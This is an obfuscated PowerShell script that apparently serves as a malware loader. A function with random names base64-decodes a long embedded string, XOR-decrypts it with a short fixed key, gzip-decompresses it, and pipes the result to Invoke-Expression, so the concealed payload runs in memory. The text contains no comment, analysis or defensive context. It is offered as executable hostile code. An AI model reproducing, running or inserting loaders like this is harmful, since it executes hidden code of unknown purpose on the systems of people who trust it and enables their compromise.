$m1v50wqab = [System.Text.Encoding]::ascii
function 06dp1s2vbzw3  {param($pc81fr6l9 )
  $3g14hkoei = [System.Convert]::FromBase64String($pc81fr6l9)
  $npmhwy09c= $m1v50wqab.GetBytes("4mn9s")
    $6d051uw32 = $3g14hkoei
    $lp974ytoe = $(for ($kda3jebzm = 0; $kda3jebzm -lt $6d051uw32.length; ) {
        for ($l2pr7kye0 = 0; $l2pr7kye0 -lt $npmhwy09c.length; $l2pr7kye0++) {
            $6d051uw32[$kda3jebzm] -bxor $npmhwy09c[$l2pr7kye0]
            $kda3jebzm++
            if ($kda3jebzm -ge $6d051uw32.Length) {
                $l2pr7kye0 = $npmhwy09c.length
            }
        }
    })
	$kgvz2j9m1 = New-Object System.IO.MemoryStream( , $lp974ytoe )

	    $scz0fno3b = New-Object System.IO.MemoryStream
        $gyq35sj2z = New-Object System.IO.Compression.GzipStream $kgvz2j9m1, ([IO.Compression.CompressionMode]::Decompress)
	    $gyq35sj2z.CopyTo( $scz0fno3b )
        $gyq35sj2z.Close()
		$kgvz2j9m1.Close()
		[byte[]] $1eyjs3zqu = $scz0fno3b.ToArray()
 $y8ogxjput=$1eyjs3zqu
    return $y8ogxjput
}
[System.Text.Encoding]::ascii.GetString((06dp1s2vbzw3 "K+ZmOXM0bW49c7k5A0rQAn2QZRXMYnSsPUQQPqWL1jNcwJOMSZ/MoY7kFSaZ/7GmGfBW/VYYEafxkULkY44aA2CsDP5PhO0K8WQ64xkWbmrDeX0l+hSh7dxjlXozeoMQKfzhR3rvrwkvP6ewGFCSR3pH3IZ2RzDBBE2GO17anjroq6q+w4su2mTxyJPVgeKdbVebW2zkjc/HsIoGzi+5CHGzbLvepDTtG/hKLpZASz4v7EJGsV8jcpMZ5ICs9ynen6J7yinLO/wfRIxy4ea+D9TB84C7PJ4uN6iQnIhyCqLg19q57/KfLPb106JMLiGVfiXGTZ6n/imDD7oMoQA0qdh7kD1iVswFI9VUhJj9JHgoTe/8vFSePbncMa5rQSI0vc6JslF5SJge396BtMGLLyEBPeUEt/fGng/V61LarQ7ZOXnpHUHyJFeMVT4sT7hPOKKYhFrSwkYE0TXb4m7JslQMPnywr9ckZvgn5/HetyAGTwk+8BNhcdeYa2qOAmuaGLJJsmYurKUULf8XvhqPVLoArc4wO5j/sO/ZHT6VrLv2m1DKKqyUAnGWu3MZe2QZTAvd5MJmjwx2QmUWV8asloOYlT9qWuYkeMwyH2STGn/h8ErkRdrmDjOypAruaK49C/mQZ7ccOvL9h9YFfbMnKZjhVcmRKtQfGhjzxvwzdDms9K7vtPmmnhBw+phiZ/3J/RkGmd/EvyYx9g5hNsBsKGora+HiHNhUmdN6hIrML218si1IA254vnmlmA3hMhu4waEduVxKdGA+PzwfzXlNJv8EzBpkkLCcb55SmLsWBCTaFqBOMjaywCLWLJFwv1q8ze06QpsaXayJg8VMCJO+Vh8d7mACgyd8dr7xAiJrPD309SyyQ8XAJ4Q0bZNxxD3lDiiasYHnDyZUlnnpcEGowhWWUkwShCpBbyAw2zsM8/eTXukGOWDpsbvBUG9ysWdKl7Qx96+JdjHm/4mJmcijiXRV7uD08LEHjdkgWI6g31ZZwGt6Uu1Emvqwp/TW3yDszBtChENICNuHdJ5oX2cqXyEQHR/fHhtNQc2RO41vJaYee5JSqK/bk5a79uT+8zmQnS73jMG3c3V6aj/W0Xk/xiDtipU0CKUgi2GSLkexACD5dTRt"))|iex;